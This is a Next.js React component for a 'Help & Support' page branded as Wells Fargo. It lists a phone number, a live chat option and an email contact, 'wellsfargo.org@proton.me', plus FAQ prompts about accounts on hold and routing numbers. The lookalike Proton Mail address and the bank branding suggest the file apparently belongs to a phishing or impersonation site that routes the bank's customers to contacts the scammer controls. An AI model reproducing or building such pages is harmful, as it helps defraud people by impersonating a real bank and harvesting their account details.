'use client';

import { useRouter } from 'next/navigation';
import { ArrowLeft, Phone, Mail, MessageSquare, ChevronRight } from 'lucide-react';

export default function SupportPage() {
  const router = useRouter();

  const contactOptions = [
    { icon: <Phone size={20} />, label: 'Call Us', value: '+1 (518) 253-5015' },
    { icon: <MessageSquare size={20} />, label: 'Live Chat', value: 'Speak with an agent' },
    { icon: <Mail size={20} />, label: 'Email', value: 'wellsfargo.org@proton.me' },
  ];

  return (
    <div className="animate-in">
      <header className="header-row" style={{ borderBottom: '1px solid #EEE', background: 'white' }}>
        <button onClick={() => router.push('/dashboard')} style={{ display: 'flex', alignItems: 'center', gap: '8px', background: 'none', border: 'none', fontWeight: 600, cursor: 'pointer', fontSize: '14px' }}>
          <ArrowLeft size={20} /> Back
        </button>
        <div className="serif-logo" style={{ fontSize: '18px', position: 'absolute', left: '50%', transform: 'translateX(-50%)' }}>
          WELLS FARGO
        </div>
        <div style={{ width: 60 }}></div>
      </header>

      <div className="page-container" style={{ maxWidth: '600px', paddingTop: '40px' }}>
        <h1 className="offer-h1" style={{ fontSize: '32px', marginBottom: '8px' }}>Help & Support</h1>
        <p style={{ color: '#666', marginBottom: '32px' }}>We&apos;re here to help you 24/7.</p>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
          {contactOptions.map((item, idx) => (
            <div key={idx} style={{ background: 'white', padding: '20px', borderRadius: '16px', border: '1px solid #EEE', display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                <div style={{ color: '#D1121F' }}>{item.icon}</div>
                <div>
                  <div style={{ fontWeight: 700, fontSize: '16px' }}>{item.label}</div>
                  <div style={{ fontSize: '14px', color: '#666' }}>{item.value}</div>
                </div>
              </div>
              <ChevronRight size={20} color="#CCC" />
            </div>
          ))}
        </div>

        <div style={{ marginTop: '40px' }}>
          <h2 style={{ fontSize: '20px', fontWeight: 700, marginBottom: '16px' }}>Frequently Asked Questions</h2>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
            <div style={{ padding: '16px', background: 'white', border: '1px solid #EEE', borderRadius: '12px', fontSize: '14px', fontWeight: 600 }}>Why is my account on hold?</div>
            <div style={{ padding: '16px', background: 'white', border: '1px solid #EEE', borderRadius: '12px', fontSize: '14px', fontWeight: 600 }}>How do I reset my password?</div>
            <div style={{ padding: '16px', background: 'white', border: '1px solid #EEE', borderRadius: '12px', fontSize: '14px', fontWeight: 600 }}>What is my routing number?</div>
          </div>
        </div>
      </div>
    </div>
  );
}
